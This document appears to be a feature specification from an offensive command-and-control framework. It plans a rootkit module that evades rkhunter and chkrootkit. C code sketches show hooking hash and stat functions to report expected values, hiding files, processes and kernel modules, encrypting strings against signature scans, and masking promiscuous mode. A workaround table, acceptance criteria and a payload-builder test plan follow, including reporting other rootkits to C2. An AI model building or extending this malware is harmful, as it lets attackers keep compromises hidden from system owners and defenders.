# F0220: Rootkit Discovery & Detection Evasion

## Metadata
| Field | Value |
|---|---|
| ID | F0220 |
| Priority | High |
| Status | Planned |
| MVP Phase | v2 |
| Depends on | F0200, F0201, F0202, F0203 |

## Summary
Comprehensive rootkit detection evasion and discovery capabilities. Implements techniques to evade rkhunter, chkrootkit, and similar detection tools while providing ability to discover other rootkits on the compromised system. Includes hash function hooking, file hiding, process enumeration consistency, and competing rootkit detection.

## Requirements
- Evasion of rkhunter file property checks
- Evasion of chkrootkit binary scanning
- Consistent hiding across all enumeration methods
- Detection of other rootkits (LKM, SSDT hooks, process hiding)
- Configurable evasion techniques per target
- Performance impact minimization

## rkhunter Evasion Techniques

### Hash Function Hooking

**Detection Method:** rkhunter compares MD5/SHA1 hashes of system binaries against known-good database.

**Evasion Implementation:**
`c
// Hook md5sum output for known system binaries
static const char *known_hashes[] = {
    "/usr/bin/ps", "a1b2c3d4e5f6...",
    "/usr/bin/ls", "f6e5d4c3b2a1...",
    NULL, NULL
};

uint8_t *hooked_md5(const char *filename, uint8_t *output) {
    if (is_rkhunter_process() && is_known_system_binary(filename)) {
        strcpy(output, get_expected_hash(filename));
        return output;
    }
    return real_md5(filename, output);
}

bool is_rkhunter_process() {
    pid_t rkhunter_pid = find_process_by_name("rkhunter");
    return (rkhunter_pid > 0);
}
`

### File Property Database Evasion

**Detection Method:** rkhunter stores file properties (size, permissions, owner) in database.

**Evasion Implementation:**
`c
struct stat *hooked_stat(const char *path, struct stat *buf) {
    real_stat(path, buf);

    if (is_rkhunter_process() && is_known_system_binary(path)) {
        buf->st_size = get_expected_size(path);
        buf->st_mode = get_expected_mode(path);
        buf->st_mtime = get_expected_mtime(path);
    }

    return buf;
}
`

### Known Rootkit File Scanning

**Detection Method:** rkhunter searches for known rootkit filenames in /tmp, /var/tmp, /dev/shm.

**Evasion Implementation:**
`c
struct dirent *hooked_readdir(DIR *dir) {
    struct dirent *entry;

    while ((entry = real_readdir(dir)) != NULL) {
        if (is_rkhunter_process() && is_hidden_file(entry->d_name)) {
            continue;
        }
        return entry;
    }

    return NULL;
}
`

### Hidden Process Detection Bypass

**Detection Method:** rkhunter compares process lists from /proc, ps, top for discrepancies.

**Evasion Implementation:**
`c
void hide_process_consistently(pid_t target_pid) {
    hide_from_procfs(target_pid);
    hook_get_task_by_vpid(target_pid);
    hook_seq_show_pid(target_pid);
    unlink_from_task_list(target_pid);
}

bool verify_process_hiding_consistency() {
    pid_t proc_list[MAX_PROCS];
    pid_t ps_list[MAX_PROCS];

    int proc_count = enumerate_from_procfs(proc_list);
    int ps_count = enumerate_from_ps(ps_list);

    return (proc_count == ps_count && arrays_match(proc_list, ps_list, proc_count));
}
`

### Kernel Module Hiding

**Detection Method:** rkhunter lists modules via lsmod and /proc/modules.

**Evasion Implementation:**
`c
void hide_kernel_module(struct module *mod) {
    list_del(&mod->list);
    hook_proc_modules_show(mod->name);
}

void *hooked_kallsyms_lookup_name(const char *name) {
    void *addr = real_kallsyms_lookup_name(name);

    if (addr && is_rootkit_symbol(name)) {
        return NULL;
    }

    return addr;
}
`

## chkrootkit Evasion Techniques

### Binary String Pattern Matching

**Detection Method:** chkrootkit scans system binaries for known rootkit signatures.

**Evasion Implementation:**
`c
typedef struct {
    uint8_t encrypted[64];
    size_t length;
    uint8_t key;
} encrypted_string_t;

const char *get_decrypted_string(encrypted_string_t *enc) {
    static char decrypted[64];
    xor_decrypt(enc->encrypted, decrypted, enc->length, enc->key);
    decrypted[enc->length] = '\0';
    return decrypted;
}
`

### LKM Trojan Detection (chkproc, chkdirs)

**Detection Method:** chkproc and chkdirs check /proc for inconsistencies.

**Evasion Implementation:**
`c
void ensure_proc_consistency() {
    hook_proc_pid_stat();
    hook_proc_pid_status();
    hook_proc_stat();
    hook_proc_net_tcp();
    verify_proc_pid_consistency();
}

void hide_from_chkproc() {
    struct task_struct *task = current;
    if (is_rootkit_process()) {
        strcpy(task->comm, "systemd");
        update_exe_link(task, "/usr/lib/systemd/systemd");
    }
}
`

### Promiscuous Mode Detection

**Detection Method:** ifpromisc checks if network interface is in promiscuous mode.

**Evasion Implementation:**
`c
int hooked_siocgifflags(struct ifreq *ifr) {
    int flags = real_siocgifflags(ifr);

    if (is_chkrootkit_running()) {
        flags &= ~IFF_PROMISC;
    }

    return flags;
}
`

## Other Rootkit Detection

### SSDT/IDT Hook Scanning

**Implementation:**
`c
bool detect_ssdt_hooks() {
    PKE_TABLE ke_table = get_ke_table();
    PSYSTEM_SERVICE_DESCRIPTOR_TABLE sdt = get_sdt();

    for (int i = 0; i < sdt->NumberOfServices; i++) {
        void *service = sdt->ServiceTable[i];
        void *expected = get_expected_service(i);

        if (service != expected) {
            log_hooked_service(i, service, expected);
            return true;
        }
    }

    return false;
}
`

### Hidden Kernel Module Detection

**Implementation:**
`c
struct module *detect_hidden_modules() {
    struct module *visible_modules = read_proc_modules();
    struct module *actual_modules = scan_kernel_module_list();

    struct module *hidden = NULL;
    for (int i = 0; i < actual_modules->count; i++) {
        if (!module_in_list(&actual_modules->list[i], visible_modules)) {
            hidden = actual_modules->list[i];
            break;
        }
    }

    return hidden;
}
`

## Configuration

`json
{
  "detection_evasion": {
    "rkhunter": {
      "enabled": true,
      "hash_hooking": true,
      "file_hiding": true,
      "process_consistency": true,
      "port_hiding": true,
      "module_hiding": true
    },
    "chkrootkit": {
      "enabled": true,
      "string_encryption": true,
      "proc_consistency": true,
      "promisc_evasion": true,
      "log_preservation": true
    },
    "rootkit_discovery": {
      "enabled": true,
      "ssdt_scanning": true,
      "idt_scanning": true,
      "hidden_module_detection": true,
      "conflict_detection": true
    }
  }
}
`

## Known Limitations

| Technique | Limitation | Workaround |
| :--- | :--- | :--- |
| Hash Hooking | May fail if rkhunter uses built-in Perl hash | Hook Perl hash functions too |
| File Hiding | Won't hide from raw disk scans | Use disk-level rootkit |
| Process Hiding | May be detected by comparing multiple sources | Ensure all sources are hooked |
| Module Hiding | Secure Boot may require signed modules | Use F0226 module signing |
| SSDT Detection | PatchGuard on Windows 64-bit | Use callback hooks instead |
| String Encryption | Strings visible during decryption | Decrypt on-demand only |

## Stages

### Stage 1: rkhunter Evasion Framework
**Goal:** Implement core rkhunter evasion techniques.
**Acceptance Criteria:**
- [ ] Hash function hooking for md5sum/sha1sum
- [ ] File property database evasion (stat hooking)
- [ ] Known rootkit file scanning evasion
- [ ] Startup file check evasion
- [ ] rkhunter process detection

### Stage 2: chkrootkit Evasion Framework
**Goal:** Implement chkrootkit evasion techniques.
**Acceptance Criteria:**
- [ ] Binary string encryption
- [ ] /proc consistency hooks
- [ ] Promiscuous mode evasion
- [ ] Log file preservation
- [ ] chkrootkit process detection

### Stage 3: Process/Port Hiding Consistency
**Goal:** Ensure consistent hiding across all enumeration methods.
**Acceptance Criteria:**
- [ ] Process hiding from /proc, ps, top consistently
- [ ] Port hiding from netstat, ss, /proc/net consistently
- [ ] Verification function for consistency
- [ ] No discrepancies detectable by comparison

### Stage 4: Other Rootkit Detection
**Goal:** Implement competing rootkit discovery.
**Acceptance Criteria:**
- [ ] SSDT hook detection
- [ ] IDT hook detection
- [ ] Hidden kernel module detection
- [ ] Process hiding conflict detection
- [ ] Report other rootkits to C2

### Stage 5: Integration & Testing
**Goal:** Integrate with existing rootkit and test against tools.
**Acceptance Criteria:**
- [ ] Evasion enabled/disabled via configuration
- [ ] No performance impact when disabled
- [ ] Passes rkhunter --check on test VMs
- [ ] Passes chkrootkit on test VMs
- [ ] Detects test rootkits (lrk, t0rn)

## Feature Acceptance Criteria

- [ ] rkhunter --check shows no warnings on instrumented system
- [ ] chkrootkit shows no warnings on instrumented system
- [ ] Process hiding consistent across ps, top, /proc
- [ ] Port hiding consistent across netstat, ss, /proc/net
- [ ] Can detect at least 3 known rootkits (lrk, t0rn, Adore)
- [ ] Hash hooking returns correct values for system binaries
- [ ] Performance overhead < 5% when evasion enabled

## Test Plan

### Unit Tests

**Hash Hooking:**
- [ ] test_md5_hook_returns_expected_hash_for_known_binary
- [ ] test_md5_hook_returns_real_hash_for_unknown_binary
- [ ] test_sha1_hook_returns_expected_hash_for_known_binary
- [ ] test_is_rkhunter_process_detects_rkhunter

**File Hiding:**
- [ ] test_readdir_hook_skips_hidden_files
- [ ] test_stat_hook_returns_expected_values
- [ ] test_access_hook_returns_not_found_for_hidden
- [ ] test_hidden_file_pattern_matching

**Process Hiding:**
- [ ] test_process_hidden_from_procfs
- [ ] test_process_hidden_from_ps
- [ ] test_process_hidden_from_top
- [ ] test_process_hiding_consistency_verification

**Rootkit Detection:**
- [ ] test_detect_ssdt_hooks_finds_hooked_service
- [ ] test_detect_idt_hooks_finds_hooked_interrupt
- [ ] test_detect_hidden_modules_finds_unlinked_module
- [ ] test_detect_process_hiding_conflicts_finds_mismatch

### System / Integration Tests

**rkhunter Evasion:**
- [ ] Run rkhunter --check on Ubuntu 22.04; verify no warnings
- [ ] Run rkhunter --check on CentOS 8; verify no warnings
- [ ] Run rkhunter --propupd then --check; verify still no warnings
- [ ] Run rkhunter with different hash algorithms (MD5, SHA1, SHA256); verify evasion works

**chkrootkit Evasion:**
- [ ] Run chkrootkit on Ubuntu 22.04; verify no warnings
- [ ] Run chkrootkit on CentOS 8; verify no warnings
- [ ] Run chkrootkit chkproc; verify no LKM detected
- [ ] Run chkrootkit chkdirs; verify no hidden dirs detected

**Process/Port Hiding:**
- [ ] Hide process; verify hidden from ps, top, /proc, htop
- [ ] Hide port; verify hidden from netstat, ss, lsof
- [ ] Run rkhunter hidden_procs test; verify passes
- [ ] Run rkhunter hidden_ports test; verify passes

**Rootkit Discovery:**
- [ ] Load lrk rootkit; verify F0220 detects it
- [ ] Load t0rn rootkit; verify F0220 detects it
- [ ] Hook SSDT manually; verify detection works
- [ ] Hide module from /proc/modules; verify detection works

### Playwright Tests

- [ ] Rootkit builder shows detection evasion options
- [ ] Enable rkhunter evasion; generate payload
- [ ] Enable chkrootkit evasion; generate payload
- [ ] Enable rootkit discovery; generate payload
- [ ] View evasion status and detection results on beacon detail
- [ ] Configure evasion patterns (hidden files, processes)

## Related Features

- **Overview:** [F0200](0200-rootkit-suite-overview.md)
- **Linux LKM:** [F0201](0201-linux-lkm-rootkit.md)
- **Linux eBPF:** [F0202](0202-linux-ebpf-rootkit.md)
- **Windows:** [F0203](0203-windows-rootkit.md)
- **Evasion:** [F0206](0206-rootkit-evasion.md)
- **Testing:** [F0229](0229-evasion-testing.md)
